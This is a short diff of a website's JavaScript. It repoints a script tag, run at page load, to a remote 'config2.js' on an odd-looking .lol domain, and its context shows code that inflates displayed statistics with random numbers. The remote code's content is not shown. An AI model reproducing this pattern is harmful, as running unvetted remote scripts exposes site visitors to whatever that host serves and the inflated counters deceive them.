@@ -1,6 +1,6 @@
-// 1. 顶层立即
+// 1. 顶层
 const cfgScript = document.createElement('script');
-cfgScript.src = 'https://66.com/config.js';
+cfgScript.src = 'https://xiezuowen.zhongzzzzz.lol/config2.js';
 document.head.appendChild(cfgScript);
 
 document.addEventListener('DOMContentLoaded', function() {
@@ -57,7 +57,7 @@ document.addEventListener('DOMContentLoaded', function() {
     if (statsElements.length > 0) {
         statsElements.forEach(el => {
             let currentVal = parseInt(el.innerText) || 100;
-  
+
             setTimeout(() => {
                 el.innerText = currentVal + Math.floor(Math.random() * 5);
             }, 1000);
